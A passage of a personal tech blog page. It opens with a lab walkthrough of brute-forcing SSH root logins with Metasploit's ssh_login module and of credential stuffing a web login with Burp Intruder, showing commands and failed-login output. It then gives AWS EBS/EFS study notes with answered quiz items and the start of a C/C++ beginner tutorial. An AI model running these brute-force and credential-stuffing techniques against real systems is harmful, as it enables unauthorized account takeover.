/usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">pass_file =&gt; /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.19.140</span><br><span class="line">rhosts =&gt; 192.168.19.140</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                    Required  Description</span><br><span class="line">   ----              ---------------                    --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>                              <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>                              no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                                  <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                              no        Try each user/password couple stored <span class="keyword">in</span> the current databa</span><br><span class="line">                                                                  se</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>                              no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                              no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none                               no        Skip existing credentials stored <span class="keyword">in</span> the current database (</span><br><span class="line">                                                                  Accepted: none, user, user&amp;realm)</span><br><span class="line">   PASSWORD                                             no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE         /usr/share/wordlists/metasploit/u  no        File containing passwords, one per line</span><br><span class="line">                     nix_passwords.txt</span><br><span class="line">   RHOSTS            192.168.19.140                     <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/u</span><br><span class="line">                                                                  sing-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT             22                                 <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                              <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                                  <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          root                               no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                                        no        File containing <span class="built_in">users</span> and passwords separated by space, on</span><br><span class="line">                                                                  e pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                              no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                                            no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>                              <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> threads  10</span><br><span class="line">threads =&gt; 10</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> verbose <span class="literal">true</span> </span><br><span class="line">verbose =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="literal">true</span></span><br><span class="line">[*] <span class="built_in">exec</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.19.140:22 - Starting bruteforce</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:admin&#x27;</span></span><br><span class="line">[!] No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456789&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:password&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:iloveyou&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:princess&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:1234567&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345678&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:abc123&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:nicole&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:daniel&#x27;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<h3 id="Credential-Stuffing-and-Password-Spraying"><a href="#Credential-Stuffing-and-Password-Spraying" class="headerlink" title="Credential Stuffing and Password Spraying"></a><strong>Credential Stuffing and Password Spraying</strong></h3><ul>
<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/</a></li>
</ul>
<p><img src="/img/exploit_Untitled_6.png" alt="Untitled"></p>
<ul>
<li>開啟這個Proxy及Burp Suite攔截目標網站的登入訊息</li>
</ul>
<p><img src="/img/exploit_Untitled_7.png" alt="Untitled"></p>
<ul>
<li>burp suite intercept message send to Intruder</li>
</ul>
<p><img src="/img/exploit_Untitled_8.png" alt="Untitled"></p>
<ul>
<li>修改Attack type &gt; Pitchfork</li>
</ul>
<p><img src="/img/exploit_Untitled_9.png" alt="Untitled"></p>
<ul>
<li>寫入蒐集到的mail、passwd資訊</li>
</ul>
<p><img src="/img/exploit_Untitled_10.png" alt="Untitled"></p>
<p><img src="/img/exploit_Untitled_11.png" alt="Untitled"></p>
<ul>
<li><p>開啟攻擊並進行帳號密碼爆破</p>
<p>  <img src="/img/exploit_Untitled_12.png" alt="Untitled"></p>
</li>
<li><p>可以通過回應訊息內容進行過濾</p>
</li>
<li><p>開啟Intruder &gt; Option &gt; Grap - Match &gt; clear &gt; Paste</p>
</li>
<li><p>Attack &gt; Pause</p>
<ul>
<li>check box 有打勾表示網頁有顯示Grep - Match的內容，可以透過這快速知道登入情況</li>
</ul>
</li>
</ul>
<p><img src="/img/exploit_Untitled_13.png" alt="Untitled"></p>
<p><img src="/img/exploit_Untitled_14.png" alt="Untitled"></p>
<p><img src="/img/exploit_Untitled_15.png" alt="Untitled"></p>
<ul>
<li>通過這個方式去尋找可能有弱密碼的可能</li>
<li>爆破需要時間，若大量發送可能會觸發防火牆告警</li>
<li>通常需要帳號&#x2F;密碼表讓爆破可以嘗試的內容更多</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-EBS" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/EBS/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.081Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/EBS/">
        AWS EC2 Instance Storage
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="EBS-Volume-彈性塊存儲"><a href="#EBS-Volume-彈性塊存儲" class="headerlink" title="EBS Volume 彈性塊存儲"></a>EBS Volume 彈性塊存儲</h3><p><img src="/img/EBS.png" alt="Untitled"></p>
<ul>
<li>網路驅動器</li>
<li>實例運行時將其連接到實例上</li>
<li>實例即使終止，EBS也允許我們保留數據</li>
<li>重新創建一個實例，並裝載到之前同一個EBS可以取回數據</li>
<li>在CCP Level 一次只能裝載到一個實例</li>
<li>創建EBS時，它將綁訂到特定的可用區域(AZ)<ul>
<li>假設使用us-east-1a則無法連接到us-east-1b</li>
<li>執行快照，則可以在不同的可用性區域之間移動Volume</li>
</ul>
</li>
<li>每月提供30GB免費存儲類型的通用或SSD或磁性</li>
<li>使用網路在實例跟EBS中通訊</li>
<li>可快速地從EC2實例分離並連接到另一個實例</li>
<li>需提前調配容量</li>
<li>可為配置容量付費，如果希望獲得更好的性能或更大的容量</li>
<li>長期存儲</li>
</ul>
<h3 id="EC2-Instance-Store-→-臨時存儲"><a href="#EC2-Instance-Store-→-臨時存儲" class="headerlink" title="EC2 Instance Store → 臨時存儲"></a>EC2 Instance Store → 臨時存儲</h3><p>如果需要更高性能的硬體磁碟，使用EC2 Instance Store</p>
<p>連接到真實的硬體服務器</p>
<p>使用EC2實例存儲實現更好的IO性能</p>
<p>如果希望獲得極高的磁盤性能，可以選擇這方案</p>
<p>如果停止或終止EC2實例，存儲將丟失</p>
<p>如果有緩衝區、緩存、如果希望有臨時數據、臨時內容</p>
<p>服務器發生故障，將面臨巨大損失的風險，連接到EC2實例的硬體也將發生故障</p>
<p>全部責任是確保備份，並根據需要進行複製</p>
<h3 id="終止時刪除"><a href="#終止時刪除" class="headerlink" title="終止時刪除"></a>終止時刪除</h3><p><img src="/img/EBS1.png" alt="Untitled"></p>
<ul>
<li>默認情況下，Delete on Termination 對於Root Volume 處於選中狀態<ul>
<li>Root EBS Volume 將與被終止的實例一起刪除</li>
</ul>
</li>
<li>對於新的EBS Volume ，此選項未處於選中狀態<ul>
<li>任何其他連接的EBS Volume 都不會被刪除</li>
</ul>
</li>
<li>如果希望終止實例時保留Root Volume，則可以禁用Root Volume 的Delete on Termination</li>
</ul>
<h3 id="EBS-Snapshots"><a href="#EBS-Snapshots" class="headerlink" title="EBS Snapshots"></a>EBS Snapshots</h3><ul>
<li>EBS快照是EBS Volume 在任意時間點的備份</li>
<li>不必將EBS Volume 從EC2實例中分離</li>
<li>可以跨不同的可用性區域甚至跨不同的區域複製這些EBS快照</li>
</ul>
<p><img src="/img/EBS2.png" alt="Untitled"></p>
<ul>
<li><p>封存快照 Archive</p>
<p>  <img src="/img/EBS3.png" alt="Untitled"></p>
<ul>
<li>快照移動到封存層</li>
<li>成本最多可以降低75%</li>
<li>恢復歸檔將需要24~72小時</li>
</ul>
</li>
<li><p>回收站EBS快照 Recycle Bin</p>
<ul>
<li>如果刪除EBS Snapshots，不是永久刪除，會在Recycle Bin中</li>
<li>可以從意外刪除中恢復<ul>
<li>可以設置為一天到一年的保留時間</li>
</ul>
</li>
</ul>
</li>
<li><p>快速快照恢復 Fast Snapshot Restore (FSR)</p>
<ul>
<li>強制快照進行完全初始化，以便在第一次使用時沒有延遲</li>
<li>如果快照很大，需要初始化EBS或需要快速從其中實例化出來</li>
<li>需要花費大量資金</li>
</ul>
</li>
</ul>
<h3 id="EBS-Volume-Types"><a href="#EBS-Volume-Types" class="headerlink" title="EBS Volume Types"></a>EBS Volume Types</h3><p><img src="/img/EBS4.png" alt="Untitled"></p>
<ul>
<li>6 types<ul>
<li>gp2&#x2F;gp3 (SSD)<ul>
<li>平衡各種工作負載的價格和性能</li>
<li>為了實現經濟高效的存儲延遲</li>
<li>gp2<ul>
<li>具有低延遲的經濟高效的存儲</li>
<li>可將其用於系統引導Volume</li>
<li>1GB~16TB不等</li>
<li>有些較小的gp2 Volume 可以爆發到3000 IOPS</li>
<li>Volume 的大小和IOPS關聯</li>
<li>IOPS、吞吐量連接再一起無法單獨設置</li>
<li>如果增加IOPS、Volume GB數，將獲得3個以上的IOPS，最高到16000 IOPS ⇒ 5334 GB(最大值)</li>
</ul>
</li>
<li>gp3<ul>
<li>新一代Volume</li>
<li>可獨立設置IOPS和吞吐量</li>
<li>提供了3000 IOPS的基線和每秒125MB的吞吐量</li>
<li>可以將IOPS增加到16000</li>
<li>吞吐量增加到每秒1000MB</li>
</ul>
</li>
</ul>
</li>
<li>Provisioned IOPS (PIOPS SSD) Input&#x2F;Output Operations Per Second<ul>
<li><p>用於需要維持IOPS性能的關鍵業務應用程式</p>
</li>
<li><p>需要大量的IOPS(可能超過16000的應用程式)</p>
</li>
<li><p>存儲性能和一致性非常敏感的數據工作負載</p>
</li>
<li><p>io1(4GiB-16GiB(最大可調配))</p>
<ul>
<li>對於Nitro EC2實例，最大PIOPS約為64000</li>
<li>對於其他類型的實例，最大PIOPS約為32000</li>
<li>可以獨立於存儲大小來增加調配的IOPS</li>
</ul>
</li>
<li><p>io2 Block Express(4GiB-64TiB)</p>
<ul>
<li>Sub-millisecond 等級的延遲</li>
<li>獲得大量的最大IOPS<ul>
<li>256000 with an IOPS:GiB ratio of 1000:1</li>
</ul>
</li>
<li>性能非常高的I&#x2F;O類型的Volume</li>
</ul>
</li>
<li><p>支持EBS多連接功能</p>
<p>  <img src="/img/EBS5.png" alt="Untitled"></p>
<ul>
<li>允許將相同的EBS Volume 連接到同一可用性區域中的多個EC2實例</li>
<li>僅適用io1、io2系列的EBS Volume</li>
<li>每個實例都將擁有對高性能Volume 的完全讀寫權限，意味著可以同時讀寫</li>
<li>在clustered Linux Application(Teradata 或你的應用程式必須管理併發寫入操作) 將獲得更高的應用程式可用性</li>
<li>僅在指定可用性區域中可用</li>
<li>不允許將EBS Volume 從一個連接到另一個<ul>
<li>多連接的另一個限制是一次<strong>最多可以連接16個EC2實例</strong></li>
</ul>
</li>
<li>要使其正常工作，必須使用一個支持集群的文件系統<ul>
<li>不同於XFS、EXT4</li>
</ul>
</li>
</ul>
</li>
<li><p>io1&#x2F;io2 Block Express (SSD)</p>
<ul>
<li>性能最高的SSD Volume</li>
<li>用於任務關鍵型低延遲和高吞吐量工作負載</li>
</ul>
</li>
</ul>
</li>
<li>Hard Disk Drives<ul>
<li>不能是Boot Volume</li>
<li>僅適用於以前類型的Volume</li>
<li>125GiB - 16 TiB</li>
<li>st1 (HDD)<ul>
<li>經吞吐量優化的HDD</li>
<li>適合大數據、數據倉庫、日誌處理</li>
<li>最大吞吐量為每秒500MB&#x2F;s</li>
<li>最大IOPS 為500</li>
<li>為頻繁訪問的吞吐量密集型工作負載而設計的低成本HDD Volume</li>
</ul>
</li>
<li>sc1 (HDD)<ul>
<li>成本最低的HDD Volume</li>
<li>設計用於訪問頻率較低的工作負載</li>
<li>用於歸檔數據<ul>
<li>不經常訪問的數據</li>
</ul>
</li>
<li>當需要盡可能低的成本時可以使用它</li>
<li>最大吞吐量為每秒250 MiB&#x2F;s</li>
<li>最大IOPS為250</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>如何定義EBS Volume ?<ul>
<li>考慮 Size |Throughput IOPS (I&#x2F;O Ops Per Sec)</li>
</ul>
</li>
<li>通用SSD與預配置IOPS SSD(如果需要數據庫)與st1、sc1(如果需要高吞吐量和最低成本)</li>
<li>如果想要獲得超過32000 IOPS，則需要具有io1 or io2的EC2 Nitro</li>
</ul>
<h3 id="EBS-Encryption"><a href="#EBS-Encryption" class="headerlink" title="EBS Encryption"></a>EBS Encryption</h3><ul>
<li>當創建並加密EBS Volume 時<ul>
<li>Volume 中的靜態數據被加密</li>
<li>實例和Volume 之間傳輸的所有數據都被加密</li>
<li>所有快照都將被加密</li>
<li>從快照創建的所有Volume 都將被加密</li>
</ul>
</li>
<li>所有加密和解密機制都透明的處理<ul>
<li>一切都由EC2和EBS在後台處理</li>
</ul>
</li>
<li>對延遲的影響非常小</li>
<li>利用了KMS(AES-256)的密鑰</li>
<li>Copy 未加密的快照時，就啟用了加密</li>
<li>如何加密未加密的EBS Volume<ul>
<li>創建該Volume 的EBS快照</li>
<li>複製功能加密EBS快照</li>
<li>從快照創建一個新的EBS Volume</li>
<li>該Volume 也將被加密</li>
<li>將加密的 Volume 連接到原始實例</li>
</ul>
</li>
</ul>
<h3 id="AMI-Amazon-Machine-Image"><a href="#AMI-Amazon-Machine-Image" class="headerlink" title="AMI &gt; Amazon Machine Image"></a>AMI &gt; Amazon Machine Image</h3><p><img src="/img/EBS6.png" alt="Untitled"></p>
<ul>
<li>可以使用AWS創建的AMI</li>
<li>自訂義自己的AMI<ul>
<li>自己的軟體配置</li>
<li>定義和設置操作系統</li>
<li>設定監控工具</li>
<li>獲得更快的啟動時間和配置時間</li>
</ul>
</li>
<li>針對特定區域構建<ul>
<li>可跨區域複製</li>
</ul>
</li>
<li>可從不同類型的AMI啟動EC2實例</li>
<li>可以從AWS Marketplace AMI啟動EC2實例<ul>
<li>由其他人創建的AMI</li>
<li>可能由其他人銷售</li>
<li>也可以自己在AWS市場上創建一個銷售AMI的業務</li>
</ul>
</li>
<li>AMI Process<ul>
<li>啟動一個EC2實例並對其自訂義</li>
<li>停止實例確保數據完整性正確</li>
<li>根據實例構建AMI，這樣還可以在後台創建EBS快照</li>
<li>從其他AMI啟動實例</li>
</ul>
</li>
</ul>
<h3 id="EFS-彈性文件系統-Elastic-File-System-Service"><a href="#EFS-彈性文件系統-Elastic-File-System-Service" class="headerlink" title="EFS 彈性文件系統 Elastic File System Service"></a>EFS 彈性文件系統 Elastic File System Service</h3><p><img src="/img/EBS7.png" alt="Untitled"></p>
<ul>
<li><p>託管NFS (Network file system)</p>
</li>
<li><p>網路文件系統</p>
</li>
<li><p>可以掛載到許多EC2實例上</p>
<ul>
<li>EC2可以位於不同的可用性區域</li>
</ul>
</li>
<li><p>高度可用，可自動擴展，昂貴</p>
</li>
<li><p>按使用量付費</p>
<ul>
<li>用於EFS中的每GB數據</li>
</ul>
</li>
<li><p>不必提前配置容量</p>
</li>
<li><p>內容管理、web 服務、數據共享、Wordpress</p>
</li>
<li><p>內部使用NFSv4.1 協議</p>
</li>
<li><p>為了控制EFS的訪問，需要設置安全群組</p>
</li>
<li><p>只兼容基於Linux的AMI，而不是Windows</p>
</li>
<li><p>使用KMS在EFS驅動器中啟用靜態加密</p>
</li>
<li><p>它是Linux上的標準文件系統，因此使用POSIX系統，具有標準文件API</p>
</li>
<li><p>EFS規模</p>
<ul>
<li>可以獲得數千個併發NFS客戶端和10GB+&#x2F;s吞吐量</li>
<li>自動擴展到PB級的網路文件系統</li>
</ul>
</li>
<li><p>創建EFS網路文件系統時設置<strong>性能模式</strong></p>
<ul>
<li>通用(默認)<ul>
<li>延遲敏感的用例(WEB server, CMS..)</li>
<li>最大化吞吐量<ul>
<li>最大的I&#x2F;O</li>
<li>高延遲的網路文件系統</li>
<li>更高的吞吐量</li>
<li>高度並行</li>
<li>大數據應用程式或媒體處理需求</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>吞吐量模式</p>
<p>  <img src="/img/EBS8.png" alt="Untitled"></p>
<ul>
<li>Bursting 爆裂<ul>
<li>一個TB，每秒50MiB 加上每秒100MiB</li>
</ul>
</li>
<li>Provisioned 資源調配<ul>
<li>無論存儲大小如何都要設置吞吐量</li>
<li>隨存儲容量的增加，前一個系統的吞吐量也在增長</li>
<li>通過配置可以為1TB的存儲容量提供每秒1GB的吞吐量</li>
</ul>
</li>
<li>Elsatic<ul>
<li>根據工作負載自動調整吞吐量</li>
<li>適合不可預測的工作負載</li>
</ul>
</li>
</ul>
</li>
<li><p>存儲類型</p>
<ul>
<li><p>生命週期管理功能</p>
</li>
<li><p>Standard : 允許在一定天數後將文件移動到不同的存儲層</p>
<ul>
<li>頻繁訪問的文件標準層</li>
</ul>
</li>
<li><p>Infrequent access (EFS-IA):</p>
<ul>
<li>可以檢索文件</li>
<li>存儲文件的成本低</li>
<li>不頻繁訪問的EFS-IA層</li>
</ul>
</li>
<li><p>Archive 歸檔存儲層:</p>
<p>  <img src="/img/EBS9.png" alt="Untitled"></p>
<ul>
<li>針對很少訪問的數據</li>
<li>數據存儲在該層上的成本低，50% cheaper</li>
<li>要在存儲層之間自動移動文件，可以實施生命週期策略</li>
<li>允許定義文件在多少天後應移動到哪個層</li>
</ul>
</li>
</ul>
</li>
<li><p>可用性和持久性方面</p>
<ul>
<li>Standard<ul>
<li>當具有多個可用區設置</li>
<li>EFS跨多個可用區</li>
<li>生產工作負載非常有用</li>
</ul>
</li>
<li>One Zone<ul>
<li>只想進行開發並希望有更便宜的選擇</li>
<li>可以選擇一個區域，將提供一個可用性區域，仍然可以在其中進行備份，並與IA類型的存儲層兼容(EFS One Zone-IA)</li>
</ul>
</li>
</ul>
</li>
<li><p>通過使用正確的EFS存儲類型，可以節省高達90%的成本</p>
</li>
<li><p>EBS volumes</p>
<p>  <img src="/img/EBS10.png" alt="Untitled"></p>
<ul>
<li>一次連接到一個實例<ul>
<li>除了使用io1和io2類型volumes的多連接功能邊緣情況外</li>
</ul>
</li>
<li>在AZ級別鎖定</li>
<li>gp2<ul>
<li>如果磁盤大小增加，IO將增加</li>
</ul>
</li>
<li>gp3 &amp; io1<ul>
<li>獨立於磁盤大小增加IO</li>
</ul>
</li>
<li>要跨AZ遷移EBS，需要拍快照<ul>
<li>將快照恢復到另一個AZ</li>
<li>EBS volumes備份，將使用大量IO，不應該在應用程式處理大量流量時運行他們，因為可能影響性能</li>
</ul>
</li>
<li>如果EC2被終止，實例的路由EBS volumes將默認被終止<ul>
<li>可以禁用該行為</li>
</ul>
</li>
</ul>
</li>
<li><p>EFS volumes</p>
<p>  <img src="/img/EBS11.png" alt="Untitled"></p>
<ul>
<li>網路文件系統</li>
<li>目標是將其連接到可用性區域中的數百個實例</li>
<li>對於一個EFS，可以在不同的AZ中擁有不同的掛載目標</li>
<li>多個實例可以一起共享該文件系統</li>
<li>只適用Linux(POSIX)</li>
<li>EFS價位高於EBS，但可以利用存儲層節省成本</li>
<li>對於實例存儲，它是物理連接到EC2實例的，因此如果失去了EC2實例，你也會失去存儲</li>
</ul>
</li>
</ul>
<p><strong>You have just terminated an EC2 instance in <code>us-east-1a</code>, and its attached EBS volume is now available. Your teammate tries to attach it to an EC2 instance in <code>us-east-1b</code> but he can’t. What is a possible cause for this?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>He’s missing IAM permissions</strong></li>
<li><input disabled="" type="checkbox"> • <strong>EBS volumes are locked to an AWS Region</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>EBS volumes are locked to an Availability Zone</strong></li>
</ul>
<p><strong>You have launched an EC2 instance with two EBS volumes, Root volume type and the other EBS volume type to store the data. A month later you are planning to terminate the EC2 instance. What’s the default behavior that will happen to each EBS volume?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Both the root volume type and the EBS volume type will be deleted</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>The Root volume type will be deleted and the EBS volume type will not be deleted</strong></li>
<li><input disabled="" type="checkbox"> • <strong>The root volume type will not be deleted and the EBS volume type will be deleted</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Both the root volume type and the EBS volume type will not be deleted</strong></li>
</ul>
<p><strong>You can use an AMI in N. Virginia Region <code>us-east-1</code> to launch an EC2 instance in any AWS Region.</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>True</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>False</strong></li>
</ul>
<blockquote>
<p>AMIs are built for a specific AWS Region, they’re unique for each AWS Region. You can’t launch an EC2 instance using an AMI in another AWS Region, but you can copy the AMI to the target AWS Region and then use it to create your EC2 instances.</p>
</blockquote>
<p><strong>Which of the following EBS volume types can be used as boot volumes when you create EC2 instances?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong><code>gp2</code>, <code>gp3</code>, <code>st1</code>, <code>sc1</code></strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong><code>gp2</code>, <code>gp3</code>, <code>io1</code>, <code>io2</code></strong></li>
<li><input disabled="" type="checkbox"> • <strong><code>io1</code>, <code>io2</code>, <code>st1</code>, <code>sc1</code></strong></li>
</ul>
<p><strong>What is EBS Multi-Attach?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Attach the same EBS volume to multiple EC2 instances in multiple AZs</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Attach multiple EBS volumes in the same AZ to the same EC2 instance</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Attach the same EBS volume to multiple EC2 instances in the same AZ</strong></li>
</ul>
<blockquote>
<p>Using EBS Multi-Attach, you can attach the same EBS volume to multiple EC2 instances in the same AZ. Each EC2 instance has full read&#x2F;write permissions.</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Attach multiple EBS volumes in multiple AZs to the same EC2 instance</strong></li>
</ul>
<p><strong>You would like to encrypt an unencrypted EBS volume attached to your EC2 instance. What should you do?</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>Create an EBS snapshot of your EBS volume. Copy the snapshot and tick the option to encrypt the copied snapshot. Then, use the encrypted snapshot to create a new EBS volume</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Select your EBS volume, choose Edit Attributes, then tick the Encrypt using KMS option</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Create a new encrypted EBS volume, then copy data from your unencrypted EBS volume to the new EBS volume.</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Submit a request to AWS Support to encrypt your EBS volume</strong></li>
</ul>
<p><strong>You have a fleet of EC2 instances distributes across AZs that process a large data set. What do you recommend to make the same data to be accessible as an NFS drive to all of your EC2 instances?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Use EBS</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Use EFS</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Use an Instance Store</strong></li>
</ul>
<p><strong>You would like to have a high-performance local cache for your application hosted on an EC2 instance. You don’t mind losing the cache upon the termination of your EC2 instance. Which storage mechanism do you recommend as a Solutions Architect?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>EBS</strong></li>
<li><input disabled="" type="checkbox"> • <strong>EFS</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Instance Store</strong></li>
</ul>
<p><strong>You are running a high-performance database that requires an IOPS of 310,000 for its underlying storage. What do you recommend?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>gp2</code> drive</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>io1</code> drive</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Use an EC2 Instance Store</strong></li>
</ul>
<blockquote>
<p>You can run a database on an EC2 instance that uses an Instance Store, but you’ll have a problem that the data will be lost if the EC2 instance is stopped (it can be restarted without problems). One solution is that you can set up a replication mechanism on another EC2 instance with an Instance Store to have a standby copy. Another solution is to set up backup mechanisms for your data. It’s all up to you how you want to set up your architecture to validate your requirements. In this use case, it’s around IOPS, so we have to choose an EC2 Instance Store.</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>io2</code> Block Express drive</strong></li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-C_Cpp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/C_Cpp/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.080Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/C_Cpp/">
        C And C++ Zero To Hero?
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="C-C-從入門到精通"><a href="#C-C-從入門到精通" class="headerlink" title="C&#x2F;C++從入門到精通"></a>C&#x2F;C++從入門到精通</h1><h1 id="程式入門須知"><a href="#程式入門須知" class="headerlink" title="程式入門須知"></a>程式入門須知</h1><h3 id="初學常犯der錯誤-grinning-face-with-one-large-and-one-small-eye"><a href="#初學常犯der錯誤-grinning-face-with-one-large-and-one-small-eye" class="headerlink" title="初學常犯der錯誤 :grinning_face_with_one_large_and_one_small_eye:"></a>初學常犯der錯誤 :grinning_face_with_one_large_and_one_small_eye:</h3><ul>
<li>常忘記在敘述行尾端打上<font color="#f11">分號(；)</font><blockquote>
<p>  cout &lt;&lt; “hi”</p>
</blockquote>
</li>
<li>在不應該出現分號的地方多打<blockquote>
<p>If(a &#x3D; b);</p>
</blockquote>
</li>
<li>大小寫沒區分</li>
</ul>
<blockquote>
<p>C&#x2F;C++語言規定大小寫字母是不同字元</p>
</blockquote>
<ul>
<li>拼錯字<blockquote>
<p>像是將char打成chr，如果錯誤訊息像是( ‘ )刮起來<font color="#f11">‘ chr ‘ was not declared in this score 字樣</font></p>
</blockquote>
</li>
<li>括弧未配成對<blockquote>
<p>有左括弧，就一定有右括弧(只要是括弧就一定是成對)</p>
</blockquote>
</li>
<li>引號未成對<blockquote>
<p>無論雙引號(用於字串)或單引號(用於字元)都要成對出現</p>
</blockquote>
</li>
<li>不該出現的空白符號<blockquote>
<p>像是namespace 打成name space 原本為連在一起的就不該隨意分開</p>
</blockquote>
</li>
</ul>
<h1 id="cin輸入"><a href="#cin輸入" class="headerlink" title="cin輸入"></a>cin輸入</h1><p><code>cin 物件可輸入文數字至指定的變數</code></p>
<ul>
<li><p><strong>可輸入字元至變數a</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> a;</span><br><span class="line">cin&gt;&gt;a;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;a&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
</li>
